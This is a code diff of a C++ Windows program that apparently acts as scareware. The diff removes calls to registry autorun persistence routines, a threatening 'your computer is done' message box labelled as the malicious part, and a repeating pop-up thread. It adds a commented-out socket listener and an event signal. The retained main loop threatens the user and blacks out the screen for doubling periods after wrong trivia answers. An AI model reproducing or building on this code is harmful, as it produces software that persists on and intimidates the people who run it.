@@ -3,6 +3,13 @@
 #include <cstdlib>
 #include <string>
 #include <exception>
+#include <mutex>
+//#include <winsock2.h>
+
+//#pragma comment(lib, "ws2_32.lib")
+
+#define PORT 8765
+
 
 #include "trivia.h"
 #include "black_screen.h"
@@ -31,8 +38,6 @@ void static AddToStartup() {
     else {
         std::cout << "Failed to open registry key!" << std::endl;
     }
-
-
 }
 
 std::string fromWcharToString(std::wstring wstr)
@@ -157,52 +162,108 @@ void viva(void)
     }
 }
 
-DWORD WINAPI msg_boxs(LPVOID lparam)
-{
-    while (true)
-    {
-    MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_OK);
-    std::this_thread::sleep_for(std::chrono::milliseconds(30000));
-    }
-    return 1;
-}
+
+
 
 
 int main()
 {
-    // adding to aurorun
-    AddToStartup();
-    AddToStartupDiffrentName();
-    // std::cout << "Running Windows Bunny program..." << std::endl;
+    /*
+    WSADATA wsaData;
+    SOCKET serverSocket, clientSocket;
+    struct sockaddr_in serverAddr, clientAddr;
+    int clientAddrSize = sizeof(clientAddr);
+    char buffer[1024] = { 0 };
+    const char* hello = "Hello from server";
 
-    // here is the melicush part!
-    MessageBox(nullptr, TEXT("DO NOT CLOSE THE TERMINAL WINDOW!\nIF YOU DO SO, YOUR COMPUTER IS DONE."), TEXT("Importent Message"), MB_OK);
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize Winsock\n";
+        return -1;
+    }
 
-    HANDLE msg_thread, trivia_thread;
+    // Create socket
+    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed\n";
+        WSACleanup();
+        return -1;
+    }
 
-    msg_thread = CreateThread(NULL, NULL, msg_boxs, NULL, 0, NULL);
-    viva();
-    //trivia_thread = CreateThread(NULL, NULL, viva, NULL, 0, NULL);
-    
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = INADDR_ANY;  // Bind to all available interfaces
+    serverAddr.sin_port = htons(PORT);
 
+    // Bind socket
+    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "Bind failed\n";
+        closesocket(serverSocket);
+        WSACleanup();
+        return -1;
+    }
+
+    // Listen for incoming connections
+    if (listen(serverSocket, 3) == SOCKET_ERROR) {
+        std::cerr << "Listen failed\n";
+        closesocket(serverSocket);
+        WSACleanup();
+        return -1;
+    }
+
+    std::cout << "Waiting for connections...\n";
+
+    // Accept incoming connection
+    if ((clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize)) == INVALID_SOCKET) {
+        std::cerr << "Accept failed\n";
+        closesocket(serverSocket);
+        WSACleanup();
+        return -1;
+    }
+
+    std::cout << "Client connected\n";
+
+    // Receive data from client
+    int recvSize = recv(clientSocket, buffer, sizeof(buffer), 0);
+    if (recvSize > 0) {
+        std::cout << "Client: " << buffer << std::endl;
+    }
+    else {
+        std::cerr << "Receive failed\n";
+    }
+    */
+    HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, TEXT("SuccessEvent"));
+    if (hEvent == NULL) {
+        std::cerr << "OpenEvent failed with error: " << GetLastError() << std::endl;
+        //return 1;
+    }
+
+    viva();    
     int black_time = 10000;
     while (true)
     {
-    int ans = make_trivia();
-    if (ans == 0 || ans == -1)
-    {
-        ascii_print();
-        printf("\n                 -------------> YOU WERE WRONG! NOW YOU WILL BE PUNISHED... <----------------\n\n");
-        std::this_thread::sleep_for(std::chrono::milliseconds(3000));
-        black_main(black_time);
-        black_time *= 2;
-        //system("pause");
-    }
-    else
-    {
-        printf("You were right this time. antil we meet again...");
-        break;
-    }
+        int ans = make_trivia();
+        if (ans == 0 || ans == -1)
+        {
+            ascii_print();
+            printf("\n                 -------------> YOU WERE WRONG! NOW YOU WILL BE PUNISHED... <----------------\n\n");
+            std::this_thread::sleep_for(std::chrono::milliseconds(3000));
+            black_main(black_time);
+            black_time *= 2;
+            //system("pause");
+        }
+        else
+        {
+            printf("You were right this time. until we meet again...");
+            SetEvent(hEvent);
+            CloseHandle(hEvent);
+            //send(clientSocket, hello, strlen(hello), 0);
+            //std::cout << "Hello message sent\n";
+
+            //// Close sockets
+            //closesocket(clientSocket);
+            //closesocket(serverSocket);
+            //WSACleanup();
+            break;
+        }
     }
 
     return 1;
